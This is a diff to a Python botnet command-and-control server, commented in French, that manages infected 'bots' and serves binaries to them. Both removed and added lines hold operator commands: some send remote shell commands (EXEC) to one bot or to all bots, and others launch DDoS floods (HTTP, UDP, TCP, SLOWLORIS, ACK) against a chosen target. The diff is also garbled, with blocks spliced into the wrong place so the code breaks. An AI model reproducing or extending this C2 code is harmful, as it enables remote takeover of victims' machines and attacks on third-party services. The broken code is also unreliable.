@@ -12,24 +12,38 @@ from urllib.parse import urlparse, parse_qs
 HOST = '0.0.0.0'  # Écoute sur toutes les interfaces
 PORT = 1337       # Port d'écoute pour le C2
 HTTP_PORT = 80    # Port pour servir les fichiers binaires
-MAX_CONNECTIONS = 100000000000
+MAX_CONNECTIONS = 9000
 BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))  # Répertoire contenant les binaires
 
-# Liste pour stocker les bots connectés
+# Liste pour stocker les bots connectés avec déduplication
 connected_bots = []
+bot_ips = set()  # Pour éviter les doublons
 lock = threading.Lock()
 
-# Statistiques
+# Statistiques et état
 total_infections = 0
 total_commands = 0
 active_ddos = 0
+active_tasks = {}  # Suivi des tâches actives par bot
+
+def is_duplicate_bot(ip):
+    """Vérifie si un bot est déjà connecté"""
+    with lock:
+        return ip in bot_ips
 
 def handle_bot(client_socket, address):
-    """Gère la connexion d'un bot individuel"""
+    """Gère la connexion d'un bot individuel de manière non-bloquante"""
     global total_infections, active_ddos
-    # Réduire les logs de connexion
-    if len(connected_bots) % 10 == 0:  # Log toutes les 10 connexions
-        print(f"[+] {len(connected_bots)} bots connectés - Dernier: {address[0]}")
+    
+    # Vérifier si c'est un doublon
+    if is_duplicate_bot(address[0]):
+        print(f"[-] Doublon détecté: {address[0]}")
+        client_socket.close()
+        return
+    
+    # Ajouter l'IP à l'ensemble des bots connus
+    with lock:
+        bot_ips.add(address[0])
     
     # Informations sur le bot
     bot_info = {
@@ -40,8 +54,14 @@ def handle_bot(client_socket, address):
         'arch': 'unknown',
         'hostname': 'unknown',
         'system_info': '',
-        'tasks': []
+        'tasks': [],
+        'active': True,
+        'last_ping': time.time()
     }
+    
+    # Log des connexions (réduit)
+    if len(connected_bots) % 10 == 0:
+        print(f"[+] {len(connected_bots)} bots connectés - Dernier: {address[0]}")
     
     try:
         # Réception du message d'identification
@@ -231,58 +251,26 @@ def command_interface():
                         print(f"Tâches récentes: {', '.join(bot['tasks'][-5:]) if bot['tasks'] else 'Aucune'}")
             except ValueError:
                 print("[!] Index de bot invalide")
-        
-        elif cmd_parts[0] == "cmd" and len(cmd_parts) > 2:
-            try:
-                bot_index = int(cmd_parts[1])
-                command = "EXEC " + " ".join(cmd_parts[2:])
-                send_command_to_bot(bot_index, command)
-            except ValueError:
-                print("[!] Index de bot invalide")
-        
-        elif cmd_parts[0] == "broadcast" and len(cmd_parts) > 1:
-            command = "EXEC " + " ".join(cmd_parts[1:])
-            broadcast_command(command)
-        
-        elif cmd_parts[0] == "ddos" and len(cmd_parts) > 3:
-            try:
-                bot_index = int(cmd_parts[1])
-                target = cmd_parts[2]
-                duration = int(cmd_parts[3])
-                method = cmd_parts[4] if len(cmd_parts) > 4 else "mix"
-                
-                if duration > 3600:  # Max 1 heure
-                    print("[!] Durée maximum autorisée: 3600 secondes (1 heure)")
-                    continue
-                    
-                command = f"DDOS {target} {duration} {method}"
-                send_command_to_bot(bot_index, command)
-                print(f"[+] Bot {bot_index} lance une attaque {method} contre {target}")
-                
-            except ValueError:
-                print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
-                
-        elif cmd_parts[0] == "ddos-all" and len(cmd_parts) > 2:
-            try:
-                target = cmd_parts[1]
-                duration = int(cmd_parts[2])
-                method = cmd_parts[3] if len(cmd_parts) > 3 else "mix"
-                
-                if duration > 3600:
-                    print("[!] Durée maximum autorisée: 3600 secondes (1 heure)")
-                    continue
-                    
-                command = f"DDOS {target} {duration} {method}"
-                active_bots = len(connected_bots)
-                broadcast_command(command)
-                print(f"[+] Attaque {method} lancée avec {active_bots} bots contre {target}")
-                
-            except ValueError:
-                print("[!] Format invalide. Utilisez: ddos-all <cible> <durée> [méthode]")
-                
-        elif cmd_parts[0] == "clear":
             os.system('cls' if os.name == 'nt' else 'clear')
-        
+            return
+            
+        if command == "EXIT":
+            print("[*] Fermeture du serveur C2...")
+            cleanup()
+            return "EXIT"
+            
+        if command == "DDOS":
+            if len(parts) != 4:
+                print("[!] Usage: DDOS <target>:<port> <time> <method>")
+                print("    Methods: HTTP, UDP, TCP, SLOWLORIS, ACK, MIX")
+                return
+                
+            target_port = parts[1]
+            if ":" not in target_port:
+                print("[!] Format invalide. Utilisez: <target>:<port>")
+                return
+                
+            target, port = target_port.split(":")
         elif cmd_parts[0] == "scan" and len(cmd_parts) > 2:
             try:
                 bot_index = int(cmd_parts[1])
